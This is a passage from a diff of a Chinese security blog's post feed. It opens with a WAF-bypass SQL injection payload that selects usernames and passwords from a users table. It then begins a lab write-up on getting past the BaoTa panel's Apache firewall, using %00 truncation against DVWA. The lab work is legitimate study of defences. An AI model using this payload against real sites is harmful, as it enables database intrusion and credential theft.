+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1.eunion--%26%67%74%3b%0aselect NULL,username,password/*%26%67%74%3b&amp;id=%00%0d*/from users </span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/28/52ovwzqNIPcZxCl.png" alt="image-20211028174713969"></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>WAF-Bypass</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WAF-Bypass之SQL注入绕过宝塔</title>
+    <url>/post/30ff95f0.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><h3 id="实验靶场"><a href="#实验靶场" class="headerlink" title="实验靶场"></a>实验靶场</h3><p>靶场：DVWA（low级别）</p>
+<p>数据库：MySQL 5.6.50</p>
+<p>Web脚本：PHP 5.6.40</p>
+<p>WAF：宝塔Linux面板 v7.6.0企业版-Apache防火墙</p>
+<p><img src="https://i.loli.net/2021/10/27/yupzNAs62GlkwtY.png" alt="image-20211027210853516"></p>
+<h2 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h2><h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p><strong>规则缺陷/特性：%00时会被认为读取已结束</strong></p>
+<p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留。</p>
+<p>%00截断是上传漏洞中常用的一个非常经典的姿势，在SQL注入中，也可以用来Bypass。在WAF层，接收参数id后，遇到%00截断，只获取到 id=1，无法获取到后面的有害参数输入。</p>
+<p><img src="https://i.loli.net/2021/10/27/m9J84eD31iGwgNy.png" alt="image-20211027211938316"></p>
+<blockquote>
+<p>注：宝塔的规则也写得非常严格，单从规则的角度来看无法完美地实现绕过，且Apache也不像IIS，能利用的协议特性较少，暂时只这发现这一种绕过思路。</p>
+</blockquote>
 ]]></content>
       <categories>
         <category>Web安全</category>
